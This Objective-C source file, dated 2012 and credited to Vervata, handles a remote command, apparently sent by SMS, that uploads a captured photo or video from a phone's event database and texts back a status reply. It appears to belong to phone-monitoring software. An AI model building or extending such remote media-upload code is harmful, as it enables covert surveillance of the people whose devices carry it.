/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  UploadActualMediaProcessor
 - Version      :  1.0
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "UploadActualMediaProcessor.h"

#import "EventRepository.h"
#import "MediaEvent.h"
#import <AVFoundation/AVFoundation.h>

#pragma mark -
@interface UploadActualMediaProcessor (PrivateAPI)
#pragma mark -

- (void) processUploadActualMedia;
- (void) uploadActualMediaException;
- (void) acknowldgeMessage;
- (void) sendReplySMS:(NSString *) aReplyMessage
   isProcessCompleted:(BOOL) aIsComplete;
- (void) processFinished;
- (BOOL) isValidArgs;

- (void) bigSize;
- (void) smallSpace;
- (void) pairingIdNotFound;
- (void) fileNotFound;
@end

#pragma mark -
@implementation UploadActualMediaProcessor
#pragma mark -

@synthesize mPairingId, mFileNotFound;

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the UploadActualMediaProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: No return type
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
    andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"UploadActualMediaProcessor--->initWithRemoteCommandData")
    if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
    }
    return self;
}

#pragma mark -
#pragma mark RemoteCmdProcessor Methods
#pragma mark -

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the UploadActualMediaProcessor
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
    DLog (@"UploadActualMediaProcessor--->doProcessingCommand")
    [self processUploadActualMedia];
}

#pragma mark -
#pragma mark UploadActualMediaProcessor Private Methods
#pragma mark -

/**
 - Method name: processUploadActualMedia
 - Purpose:This method is used to process upload actual media
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) processUploadActualMedia {

    DLog (@"UploadActualMediaProcessor--->processUploadActualMedia");
    
    NSInteger pairId = [[[mRemoteCmdData mArguments] objectAtIndex:2]intValue];
    [self setMPairingId:pairId];
    
    FxEvent *event = [[[RemoteCmdUtils sharedRemoteCmdUtils] mEventRepository] actualMedia:pairId];
    NSString *mediaPath = [(MediaEvent *)event fullPath];
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSDictionary *fileAttributes = [fileManager attributesOfItemAtPath:mediaPath error:nil];
    DLog (@"Pairing Id = %d, event-Id = %d, mediaPath = %@", pairId, [event eventId], mediaPath);
    
    NSUInteger unitMegabyte = pow(1024, 2);
    NSUInteger size = ([fileAttributes fileSize] / unitMegabyte);
    DLog (@"Media file size to upload = %d mb, attr file size = %lld", size, [fileAttributes fileSize]);
    
    if (size <= 100) { // 100 mb
        fileAttributes = [fileManager attributesOfFileSystemForPath:@"/var/" error:nil];
        NSUInteger freeSize = ([[fileAttributes objectForKey:NSFileSystemFreeSize] intValue] / unitMegabyte);
        DLog (@"freeSize of /var/ folder = %d mb", freeSize);
        
        if (freeSize > (size + 1)) {
            // Use case:
            // 1. Upload actual media with PAIRING_ID not found --- never happen since application never delete actual media record from database or
            //		user send arbitry PAIRING_ID via the SMS command or some applications else delete our events database thus we can check by event_id
            //		via return media event whether it's 0 (zero)
            // 2. Upload actual media with file not found --- handle by EDM, DDM and CSM
            // 3. File in use --- not implement not applicable in Iphone
            // 4. Reach max retry count --- not implement not applicable in Iphone
            // 5. Got exception --- not implement not applicable in Iphone
            // 6. Error --- RCM standard exception code
            
            BOOL fileNotFound = ![fileManager fileExistsAtPath:mediaPath];
            [self setMFileNotFound:fileNotFound];
            
            //Use for KnowIT Enterprise to check existing of video file becase we cannot use NSFileManager to check inside media folder
            if (fileNotFound) {
                AVURLAsset *asset = [AVURLAsset assetWithURL:[NSURL URLWithString:mediaPath]];
                if (asset) {
                    fileNotFound = NO;
                }
                else {
                    fileNotFound = YES;
                }
                [self setMFileNotFound:fileNotFound];
            }
            
            id <EventDelivery> eventDelevery=[[RemoteCmdUtils sharedRemoteCmdUtils] mEventDelivery];
            BOOL isReady = [eventDelevery deliverActualMediaWithPairId:pairId andDeliveryEventDelegate:self];;
            if (!isReady) {
                [self uploadActualMediaException];
            }
            else {
                if ([event eventId] == 0) { // Pairing Id not found response
                    // Wait for the callback otherwise subsquence upload media command will failed with EDM busy
                    //					[self performSelector:@selector(pairingIdNotFound) withObject:nil afterDelay:0.1];
                } else if (fileNotFound) { // File not found, it could be removed
                    // Wait for the callback otherwise subsquence upload media command will failed with EDM busy
                    //					[self performSelector:@selector(fileNotFound) withObject:nil afterDelay:0.1];
                } else { // Success
                    [self acknowldgeMessage];
                }
            }
        } else { // Cannot create payload of media file
            // Make asynchronous call
            [self performSelector:@selector(smallSpace) withObject:nil afterDelay:0.1];
        }
        
    } else {
        // Make asynchronous call
        [self performSelector:@selector(bigSize) withObject:nil afterDelay:0.1];
    }

}

/**
 - Method name: isValidArgs
 - Purpose:This method is used to validate Args
 - Argument list and description: No Argument
 - Return description: BOOL
 */

- (BOOL) isValidArgs {
    BOOL isValid=NO;
    NSArray *args=[mRemoteCmdData mArguments];
    if ([args count]>2) {
        NSString *argString=[args objectAtIndex:2];
        isValid=[RemoteCmdProcessorUtils isDigits:argString];
    }
    return isValid;
}

/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument
 - Return description:No Return
 */

- (void) acknowldgeMessage {
    NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                         andErrorCode:_SUCCESS_];
    NSString *ackMessage=[messageFormat stringByAppendingFormat:NSLocalizedString(@"kUploadActualMediaSucessMSG1", @""), [self mPairingId]];
    [self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aReplyMessage (NSString),isProcessCompleted(BOOL)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
    DLog (@"UploadActualMediaProcessor--->sendReplySMS...")
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
                                             andReplyMessage:aReplyMessage];
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
                                                               andMessage:aReplyMessage];
    }
    if (aIsComplete) {[self processFinished];}
    else {DLog (@"Sent aknowldge message.")}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when upload actual media process is completed
 - Argument list and description:No Argument
 - Return description:No Return Type
 */

-(void) processFinished {
    DLog (@"UploadActualMediaProcessor--->processFinished")
    if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
        [mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
    }
}

/**
 - Method name: uploadActualMediaException
 - Purpose:This method is invoked when  uploadActualMedia process failed.
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) uploadActualMediaException {
    DLog (@"UploadActualMediaProcessor--->uploadActualMediaException")
    FxException* exception = [FxException exceptionWithName:@"uploadActualMediaException" andReason:@"Upload Actual Media error"];
    [exception setErrorCode:kEventDeliveryManagerBusy];
    [exception setErrorCategory:kFxErrorRCM];
    @throw exception;
}

#pragma mark -
#pragma mark Errors
#pragma mark -

- (void) bigSize {
    NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                         andErrorCode:_ERROR_];
    NSString *errorMessage=[messageFormat stringByAppendingFormat:NSLocalizedString(@"kUploadActualMediaErrorMSG5", @""), [self mPairingId]];
    [self sendReplySMS:errorMessage isProcessCompleted:YES];
}

- (void) smallSpace {
    NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                         andErrorCode:_ERROR_];
    NSString *errorMessage=[messageFormat stringByAppendingFormat:NSLocalizedString(@"kUploadActualMediaErrorMSG6", @""), [self mPairingId]];
    [self sendReplySMS:errorMessage isProcessCompleted:YES];
}

- (void) pairingIdNotFound {
    NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                         andErrorCode:_ERROR_];
    NSString *errorMessage=[messageFormat stringByAppendingFormat:NSLocalizedString(@"kUploadActualMediaErrorMSG1", @""), [self mPairingId]];
    [self sendReplySMS:errorMessage isProcessCompleted:YES];
}

- (void) fileNotFound {
    NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                         andErrorCode:_ERROR_];
    NSString *errorMessage=[messageFormat stringByAppendingFormat:NSLocalizedString(@"kUploadActualMediaErrorMSG3", @""), [self mPairingId]];
    [self sendReplySMS:errorMessage isProcessCompleted:YES];
}

#pragma mark -
#pragma mark EventDeliveryManager Methods
#pragma mark -

/**
 - Method name: eventDidDelivered:withStatusCode:andStatusMessage
 - Purpose:This method is invoked when event is delivered
 - Argument list and description:aSuccess(Bool), aStatusCode (NSUInteger),aMessage (NSString)
 - Return description: No return type
 */

- (void) eventDidDelivered: (BOOL) aSuccess
            withStatusCode: (NSInteger) aStatusCode
          andStatusMessage: (NSString*) aMessage {

    DLog (@"RequestEventsProcessor--->eventDidDelivered")
    NSString *messageFormat =nil;
    NSString *uploadActualMediaMessage=nil;
    if  (aSuccess) {
        MediaEvent *mediaEvent = (MediaEvent *)[[[RemoteCmdUtils sharedRemoteCmdUtils] mEventRepository] actualMedia:[self mPairingId]];
        NSFileManager *fileManager = [NSFileManager defaultManager];
        BOOL fileNotFound = ![fileManager fileExistsAtPath:[mediaEvent fullPath]];
        
        //Use for KnowIT Enterprise to check existing of video file becase we cannot use NSFileManager to check inside media folder
        if (fileNotFound) {
            AVURLAsset *asset = [AVURLAsset assetWithURL:[NSURL URLWithString:[mediaEvent fullPath]]];
            if (asset) {
                fileNotFound = NO;
            }
            else {
                fileNotFound = YES;
            }
            [self setMFileNotFound:fileNotFound];
        }
        
        if ([mediaEvent eventId] == 0) {
            [self pairingIdNotFound];
        } else if (fileNotFound && [self mFileNotFound]) {
            // Both before and after deliver must be consistent if file is not found otherwise assume OK 
            [self fileNotFound];
        } else {
            messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                      andErrorCode:_SUCCESS_];
            uploadActualMediaMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kUploadActualMediaSucessMSG2", @"")];
            [self sendReplySMS:uploadActualMediaMessage isProcessCompleted:YES];
        }
    }
    else {
        uploadActualMediaMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                             andErrorCode:aStatusCode];
        [self sendReplySMS:uploadActualMediaMessage isProcessCompleted:YES];
    }

}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
    [super dealloc];
}

@end
